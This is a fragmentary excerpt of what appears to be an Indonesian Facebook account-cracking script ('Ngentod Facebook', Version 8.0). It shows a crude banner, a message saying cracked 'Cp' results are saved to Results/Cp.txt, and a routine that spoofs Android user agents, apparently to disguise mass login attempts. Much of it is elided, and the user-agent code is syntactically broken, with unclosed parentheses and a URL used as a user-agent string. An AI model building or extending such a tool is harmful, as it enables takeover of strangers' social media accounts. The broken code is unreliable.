...
[bold white]    `-'  `-'`----' `--'      `--'  `----'  
[bold blue]        \\|[bold green] Ngentod Facebook[bold blue]|/""", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] Version 8.0 [bold green]<[bold yellow]<[bold red]<"))
    return 0
### DAPATKAN NAMA ###
...
[bold white]Hasil Crack[bold red] Cp[bold white] Tersimpan Di :[bold red] Results/Cp.txt""", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Results Crack) [bold green]<[bold yellow]<[bold red]"))
    ...
    def realme_useragent(self, total):
        for _ in range(total):
            ...
            self.useragent = ('Mozilla/5.0 (Linux; Android 13; CPH2343 Build/TP1A.220624.003) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.117 Mobile Safari/537.36 GNews Android/2022116172'
            self.useragent = ('https://user-agents.net/string/nokiax2-00-5-0-08-25-profile-midp-2-1-configuration-cldc-1-1-mozilla-5-0-linux-android-11-sm-g998n-applewebkit-537-36-khtml-like-gecko-chrome-92-0-4515-166-mobile-safari-537-36-opr-65-2-3381-61420-untrusted-1-0'
            .format(self.android_version, self.android_model, self.build, self.browser_version))
